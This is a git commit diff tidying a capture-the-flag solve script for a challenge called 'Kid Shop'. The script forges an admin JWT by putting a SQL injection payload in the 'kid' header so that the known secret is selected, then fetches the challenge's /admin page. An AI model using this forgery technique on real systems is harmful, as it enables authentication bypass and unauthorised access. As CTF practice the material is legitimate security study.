5a8e1290b16273a720ad8b4906111d5b1f31068c
jeff160 <141229412+jeff-160@users.noreply.github.com>
2025-07-14 18:56:41 +0800

    prettier solve script

--- LNC 2025/Kid Shop/solve.py
+++ LNC 2025/Kid Shop/solve.py
@@ -1,19 +1,15 @@
 import jwt
 import requests
 
-url = "http://chal1.lagncra.sh:8436"
-session = requests.Session()
-session.get(url)
-
 secret = "techie_ernie_loves_kids"
 payload = f'" AND 1=0 UNION SELECT "{secret}" -- '
 
-admin_jwt = jwt.encode(
+token = jwt.encode(
     {"role": "admin"},
     secret,
     algorithm="HS256",
     headers={"kid": payload}
 )
 
-res = session.get(f"{url}/admin", cookies={"jwt": admin_jwt})
+res = requests.get(f"http://chal1.lagncra.sh:8436/admin", cookies={"jwt": token})
 print(res.text)
